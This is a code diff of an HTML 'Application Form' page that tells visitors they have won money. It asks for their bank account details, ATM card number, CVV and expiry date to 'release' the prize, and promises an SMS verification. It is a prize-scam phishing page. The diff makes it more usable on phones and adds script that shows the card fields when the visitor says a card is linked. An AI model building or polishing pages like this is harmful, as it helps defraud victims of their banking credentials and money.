@@ -1,62 +1,107 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Application Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      padding: 20px;
-      max-width: 600px;
-      margin: auto;
+      padding: 15px;
+      margin: 0;
+      background-color: #f9f9f9;
     }
+
+    form {
+      max-width: 480px;
+      margin: auto;
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 1.5em;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 12px;
+      font-weight: bold;
+      font-size: 0.95em;
+    }
+
     input, select {
       width: 100%;
       padding: 10px;
+      font-size: 1em;
       margin-top: 5px;
-      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
-    label {
-      font-weight: bold;
-    }
+
     .readonly-box {
       background-color: #f0f0f0;
       padding: 10px;
       border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-top: 8px;
+    }
+
+    .card-section {
+      display: none;
+      margin-top: 10px;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1em;
+    }
+
+    button:hover {
+      background-color: #0056b3;
     }
   </style>
 </head>
 <body>
 
-  <h2>Application Form</h2>
-
   <form id="applicationForm">
+    <h2>Application Form</h2>
 
-    <!-- 1. Full Name -->
+    <!-- 1 -->
     <label for="fullName">1. Full Name</label>
     <input type="text" id="fullName" name="fullName" required>
 
-    <!-- 2. Phone Number -->
+    <!-- 2 -->
     <label for="phoneNumber">2. Phone Number</label>
     <input type="tel" id="phoneNumber" name="phoneNumber" required>
 
-    <!-- 3. Amount You Won -->
+    <!-- 3 -->
     <label for="amountWon">3. Amount You Won</label>
     <input type="text" id="amountWon" name="amountWon" required>
 
-    <!-- 4. Bank Account Type -->
+    <!-- 4 -->
     <label for="bankType">4. Bank Account Type (e.g., Standard Bank)</label>
     <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>
 
-    <!-- 5. Bank Account Number -->
+    <!-- 5 -->
     <label for="bankNumber">5. Bank Account Number</label>
     <input type="text" id="bankNumber" name="bankNumber" required>
 
-    <!-- 6. Bank Account Holder's Name -->
+    <!-- 6 -->
     <label for="accountHolder">6. Bank Account Holder's Name</label>
     <input type="text" id="accountHolder" name="accountHolder" required>
 
-    <!-- 7. Linked ATM Card? -->
+    <!-- 7 -->
     <label for="atmLinked">7. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
     <select id="atmLinked" name="atmLinked" required>
       <option value="">--Select--</option>
@@ -64,19 +109,21 @@
       <option value="No">No</option>
     </select>
 
-    <!-- 8. ATM Card Verification -->
-    <label>8. We need to verify your details so that we release <span id="amountPreview">the amount</span> to your <span id="bankPreview">bank</span> account.</label>
+    <!-- 8 -->
+    <div class="card-section" id="cardSection">
+      <label>8. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
 
-    <label for="atmNumber">ATM Card Number</label>
-    <input type="text" id="atmNumber" name="atmNumber" maxlength="16">
+      <label for="atmNumber">ATM Card Number</label>
+      <input type="text" id="atmNumber" name="atmNumber" maxlength="16" pattern="\d{13,16}" inputmode="numeric">
 
-    <label for="cvv">CVV</label>
-    <input type="text" id="cvv" name="cvv" maxlength="4">
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\d{3,4}" inputmode="numeric" required>
 
-    <label for="expiry">Expiry Date (MM/YY)</label>
-    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
+    </div>
 
-    <!-- 9. Auto-Filled Note -->
+    <!-- 9 -->
     <label>9. Confirmation</label>
     <div class="readonly-box" id="autoFilledNote">
       You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
@@ -89,11 +136,13 @@
     const amountInput = document.getElementById("amountWon");
     const phoneInput = document.getElementById("phoneNumber");
     const bankInput = document.getElementById("bankType");
+    const atmLinked = document.getElementById("atmLinked");
 
     const amountPreview = document.getElementById("amountPreview");
     const bankPreview = document.getElementById("bankPreview");
     const bankTypePreview = document.getElementById("bankTypePreview");
     const autoFilledNote = document.getElementById("autoFilledNote");
+    const cardSection = document.getElementById("cardSection");
 
     function updateDynamicText() {
       const amount = amountInput.value || "[amount]";
@@ -109,6 +158,14 @@
     amountInput.addEventListener("input", updateDynamicText);
     phoneInput.addEventListener("input", updateDynamicText);
     bankInput.addEventListener("input", updateDynamicText);
+
+    atmLinked.addEventListener("change", () => {
+      if (atmLinked.value === "Yes") {
+        cardSection.style.display = "block";
+      } else {
+        cardSection.style.display = "none";
+      }
+    });
   </script>
 
 </body>
